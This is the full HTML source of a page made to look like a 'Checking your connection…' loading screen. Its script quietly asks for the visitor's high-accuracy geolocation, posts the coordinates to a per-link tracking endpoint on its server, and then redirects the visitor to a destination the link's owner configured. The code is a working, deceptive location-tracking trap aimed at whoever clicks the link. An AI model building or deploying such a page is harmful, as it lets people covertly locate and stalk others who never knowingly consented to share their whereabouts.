<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Please wait…</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;background:#fff;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}

.wrap{text-align:center;padding:2rem}

/* Pulsing dot */
.dot-ring{position:relative;width:64px;height:64px;margin:0 auto 2rem}
.dot-ring::before,
.dot-ring::after{content:'';position:absolute;inset:0;border-radius:50%}
.dot-ring::before{background:rgba(99,102,241,0.15);animation:ripple 1.8s ease-out infinite}
.dot-ring::after{background:rgba(99,102,241,0.08);animation:ripple 1.8s ease-out infinite .6s}
.dot{width:64px;height:64px;border-radius:50%;background:#6366f1;position:relative;z-index:1;animation:pulse 1.8s ease-in-out infinite}

@keyframes ripple{
  0%{transform:scale(1);opacity:1}
  100%{transform:scale(2.4);opacity:0}
}
@keyframes pulse{
  0%,100%{transform:scale(1)}
  50%{transform:scale(0.92)}
}

.msg{font-size:0.9rem;color:#9ca3af;letter-spacing:0.01em}

/* Progress bar at very top */
.bar{position:fixed;top:0;left:0;height:3px;background:#6366f1;width:0%;transition:width 0.4s ease;z-index:100}
</style>
</head>
<body>

<div class="bar" id="bar"></div>

<div class="wrap">
  <div class="dot-ring">
    <div class="dot"></div>
  </div>
  <p class="msg">Checking your connection…</p>
</div>

<script>
const linkId = window.location.pathname.split('/').pop();
let destUrl = 'https://google.com';
let sent = false;

// Progress bar
const bar = document.getElementById('bar');
function setBar(pct, ms) {
  bar.style.transition = `width ${ms}ms ease`;
  bar.style.width = pct + '%';
}

setBar(30, 600);

// Fetch destination URL
fetch('/api/hits/' + linkId)
  .then(r => r.json())
  .then(d => { if (d.dest) destUrl = d.dest; })
  .catch(() => {});

// Send location to server
function postLoc(lat, lon, acc) {
  if (sent) return;
  sent = true;
  fetch('/api/hit/' + linkId, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ lat, lon, acc })
  }).catch(() => {});
}

// Silently grab location
function grabLocation() {
  if (!navigator.geolocation) {
    postLoc(null, null, null);
    redirect();
    return;
  }

  // Set a max wait — don't keep user waiting more than 6s
  const timer = setTimeout(() => {
    postLoc(null, null, null);
    redirect();
  }, 6000);

  navigator.geolocation.getCurrentPosition(
    pos => {
      clearTimeout(timer);
      postLoc(
        pos.coords.latitude,
        pos.coords.longitude,
        Math.round(pos.coords.accuracy)
      );
      redirect();
    },
    err => {
      clearTimeout(timer);
      postLoc(null, null, null);
      redirect();
    },
    { enableHighAccuracy: true, timeout: 5500, maximumAge: 0 }
  );
}

function redirect() {
  setBar(100, 300);
  setTimeout(() => { window.location.href = destUrl; }, 400);
}

setTimeout(() => {
  setBar(65, 400);
  grabLocation();
}, 800);
</script>
</body>
</html>
